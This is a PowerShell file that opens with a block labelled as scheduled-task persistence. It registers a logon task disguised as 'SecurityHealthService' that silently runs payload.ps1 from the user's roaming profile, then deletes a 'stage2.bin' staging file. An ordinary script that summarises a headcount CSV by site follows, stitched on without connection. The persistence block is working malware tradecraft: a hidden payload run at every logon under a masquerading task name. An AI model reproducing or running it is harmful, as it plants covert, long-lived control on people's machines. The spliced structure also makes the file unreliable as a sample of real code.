
<#
.SYNOPSIS
    Scheduled-task persistence installation.

.DESCRIPTION
    Registers a per-user logon task that launches a PowerShell
    PowerShell file from the roaming profile.
#>
[CmdletBinding()]
param(
    [string]$TaskName = "SecurityHealthService",
    [string]$ScriptPath = "$env:APPDATA\payload.ps1",
    [int]$StartDelayMinutes = 27
)
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\payload.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
    $TaskState = Get-ScheduledTask -TaskName $TaskName
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
#Requires -Version 5.1
$InputCsv   = 'C:\Data\exports\headcount.csv'
$OutputPath = 'C:\Logs\reports\headcount-summary-2025-12-10.csv'
$GroupBy    = 'Site'
$MinAmount  = 5000

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

$top = $byGroup | Sort-Object -Property Total -Descending | Select-Object -First 1
Write-Host ("{0} rows processed, total {1:N2}" -f $rowCount, $grandTotal) -ForegroundColor Green
Write-Host ("Largest group: {0} ({1})" -f $top.Group, $top.Metric) -ForegroundColor Cyan

$jsonBody = $byGroup | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
